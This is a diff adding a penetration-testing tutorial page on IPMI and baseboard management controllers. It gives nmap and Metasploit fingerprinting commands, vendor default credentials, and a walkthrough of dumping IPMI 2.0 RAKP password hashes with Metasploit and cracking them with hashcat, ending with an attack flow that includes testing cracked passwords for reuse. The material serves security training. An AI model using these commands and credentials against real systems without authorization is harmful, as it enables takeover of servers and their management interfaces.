@@ -1,0 +1,146 @@
+# IPMI
+
+> A BMC is a tiny computer bolted to a server's motherboard that runs even when the host is powered off — and gaining access to it is nearly equivalent to physical access. IPMI 2.0 has a flaw baked into the spec that hands you the password hash of any valid user, no authentication required.
+
+<Note>**Protocol:** UDP · **Port:** 623</Note>
+
+---
+
+## What Is IPMI?
+
+The **Intelligent Platform Management Interface (IPMI)** is a standardized set of specifications for hardware-based host management. It runs as an autonomous subsystem, **independent of the host's BIOS, CPU, firmware, and operating system** — so administrators can manage and monitor a machine even when it's powered off or unresponsive.
+
+It connects directly to the system's hardware over the network and needs no login shell on the OS. Typical uses:
+
+1. Modifying BIOS settings before the OS boots
+2. Managing a host that's fully powered down
+3. Accessing a host after a system failure
+
+When it's not doing those, it monitors temperature, voltage, fan status, and power supplies. The host can be off, but the IPMI module needs a power source and a LAN connection to function.
+
+### BMCs
+
+Systems that speak IPMI are called **Baseboard Management Controllers (BMCs)** — typically embedded ARM systems running Linux, wired directly to the motherboard (built in, or added as a PCI card). The ones you'll meet most on internal tests:
+
+- **HP iLO**
+- **Dell DRAC**
+- **Supermicro IPMI**
+
+They usually expose a **web management console**, a remote-access protocol (Telnet or SSH), and the IPMI network protocol on **UDP 623**.
+
+<Tip>
+  Access to a BMC means you can monitor, reboot, power off, or even **reinstall
+  the host operating system**. It's nearly equivalent to standing in front of
+  the machine with a keyboard. Don't overlook IPMI on internal engagements — it
+  shows up constantly and a BMC web-console login is a high-risk finding on its
+  own.
+</Tip>
+
+---
+
+## Footprinting the Service
+
+### Nmap
+
+The `ipmi-version` NSE script fingerprints the protocol on UDP 623:
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+nmap -sU -p623 --script ipmi-version 10.129.14.128
+```
+
+```
+PORT    STATE SERVICE
+623/udp open  asf-rmcp
+| ipmi-version:
+|   Version:
+|     IPMI-2.0
+|   UserAuth: auth_user, non_null_user
+|_  PassAuth: password, md5, null
+```
+
+Here IPMI is listening on 623 and Nmap fingerprinted **version 2.0** — which matters, because the hash-retrieval flaw is specific to IPMI 2.0.
+
+### Metasploit Version Scan
+
+The same fingerprint is available via Metasploit:
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+use auxiliary/scanner/ipmi/ipmi_version
+set RHOSTS 10.129.14.128
+run
+```
+
+### Default Credentials
+
+Administrators frequently leave BMC default passwords in place. Worth keeping in your cheat sheet:
+
+| Vendor          | Default Username | Default Password                               |
+| --------------- | ---------------- | ---------------------------------------------- |
+| HP iLO          | `Administrator`  | factory-randomized 8-char (uppercase + digits) |
+| Dell iDRAC      | `root`           | `calvin`                                       |
+| Supermicro IPMI | `ADMIN`          | `ADMIN`                                        |
+
+Always try known defaults against **any** service you find — they're left unchanged constantly and lead to quick wins. For a BMC, they may get you into the web console or SSH/Telnet directly.
+
+---
+
+## Dangerous Settings — The RAKP Hash Flaw
+
+If default credentials don't work, IPMI 2.0 has a flaw in its **RAKP protocol** that's a core part of the specification — so there's no real "fix," only mitigation.
+
+During authentication, the server sends a **salted SHA1 or MD5 hash of the user's password to the client _before_ authentication completes.** That means you can request the password hash for **any valid user account** on the BMC, then crack it offline.
+
+### Retrieve the Hash with Metasploit
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+set RHOSTS 10.129.14.128
+run
+```
+
+```
+[+] 10.129.14.128:623 - IPMI - Hash found: ADMIN:8e1f...e3a9...:cracked password "ADMIN"
+```
+
+### Crack It with Hashcat
+
+IPMI RAKP hashes use **Hashcat mode 7300**:
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt
+```
+
+For an HP iLO at its factory-default password — eight characters of uppercase letters and digits — a mask attack covers the whole keyspace:
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
+```
+
+<Tip>
+  The real payoff is **password reuse**. The RAKP flaw gets you a hash; cracking
+  it gets you a password; and that password is often reused elsewhere. There are
+  documented engagements where a cracked IPMI hash led to SSH-as-root on many
+  critical servers and access to network monitoring consoles across the
+  environment. Mitigation is limited to very long passwords or
+  network-segmenting the BMCs — the flaw itself can't be patched away.
+</Tip>
+
+---
+
+## Quick Reference
+
+| Command                                                  | Purpose                         |
+| -------------------------------------------------------- | ------------------------------- |
+| `nmap -sU -p623 --script ipmi-version <ip>`              | Fingerprint IPMI version        |
+| `auxiliary/scanner/ipmi/ipmi_version`                    | Metasploit version scan         |
+| `auxiliary/scanner/ipmi/ipmi_dumphashes`                 | Retrieve RAKP password hashes   |
+| `hashcat -m 7300 ipmi.txt <wordlist>`                    | Crack IPMI hashes (dictionary)  |
+| `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` | Mask attack for HP iLO defaults |
+
+**Default creds to always try:** iDRAC `root:calvin` · Supermicro `ADMIN:ADMIN` · HP iLO randomized 8-char.
+
+**The footprinting flow:** nmap for UDP 623 and version → try default credentials → if those fail, dump RAKP hashes with Metasploit → crack offline with Hashcat mode 7300 → log into the BMC, and test the password for reuse elsewhere.
+
+---
+
+_Next: [MySQL](/tech/services/mysql) — database enumeration, authentication, and reading data straight off the server._
